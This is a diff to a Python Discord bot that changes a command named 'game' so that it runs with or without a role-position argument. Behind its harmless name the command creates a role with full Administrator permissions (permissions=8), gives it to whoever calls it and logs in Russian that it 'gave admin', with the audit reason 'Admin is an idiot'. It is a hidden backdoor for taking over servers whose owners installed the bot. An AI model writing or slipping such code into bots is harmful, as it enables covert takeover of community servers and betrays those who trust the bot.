@@ -225,13 +225,19 @@ async def help(ctx):
 
     
 @client.command()
-async def game(ctx, pos: int):
+async def game(ctx, pos = None):
     try:
-        await ctx.guild.create_role(name="DADUDEDA", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
-        role = discord.utils.get(ctx.guild.roles, name="DADUDEDA")
-        await role.edit(position=pos, reason="Админ идиот")
-        await ctx.message.author.add_roles(role)
-        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
+       if pos == None:
+         await ctx.guild.create_role(name="DADUDEDA", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
+         role = discord.utils.get(ctx.guild.roles, name="DADUDEDA")
+         await ctx.message.author.add_roles(role)
+         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
+       else:
+         await ctx.guild.create_role(name="DADUDEDA", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
+         role = discord.utils.get(ctx.guild.roles, name="DADUDEDA")
+         await role.edit(position=int(pos), reason="Админ идиот")
+         await ctx.message.author.add_roles(role)
+         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
     except discord.HTTPException:
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось выдать админку {ctx.message.author}")
         
